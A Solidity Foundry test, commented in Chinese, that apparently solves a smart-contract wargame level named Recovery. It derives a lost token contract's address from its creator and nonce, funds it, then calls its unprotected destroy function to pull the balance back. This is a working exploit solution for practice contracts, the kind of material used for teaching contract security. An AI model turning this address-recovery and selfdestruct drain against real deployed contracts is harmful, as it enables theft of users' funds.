pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {SimpleToken, Recovery} from "../src/Recovery.sol";


/** 
 * 解题思路：合约通过 create 创建新的合约由 Factory 合约和 nonce 值确定，通过这样的方式将地址恢复回来，然后调用 destory 方法将余额提取出来
 */
contract HackRecoveryTest is Test {
    Recovery public r;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        r = new Recovery();
    }
    function testHackRecovery() public {
        r.generateToken("test", 9999);

        // 通过获取创建者的地址和 nonce，重新将丢失的地址找回来，这里 nonce 使用 0 会失败，使用 1 才会成功，那么合约初始的 nonce 值是多少
        bytes memory data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(r), uint8(1));
        address h1 = address(uint160(uint256(keccak256(data))));
        console.log("simple token address:");
        console.logAddress(h1);

        // 发起转账，mint token
        h1.call{value: 1 ether}("");

        address payable h2 = payable(h1);

        console.log("simple token balance:");
        console.logUint(address(h1).balance);

        console.log(SimpleToken(h2).name());

        // 调用自毁程序，将余额转回当前地址
        SimpleToken(h2).destroy(payable(this));

        console.log("hacker address balance:");
        console.logUint(address(this).balance);
    }

    // 接收 SimpleToken 自毁后发送的余额
    fallback() external payable {

    }
}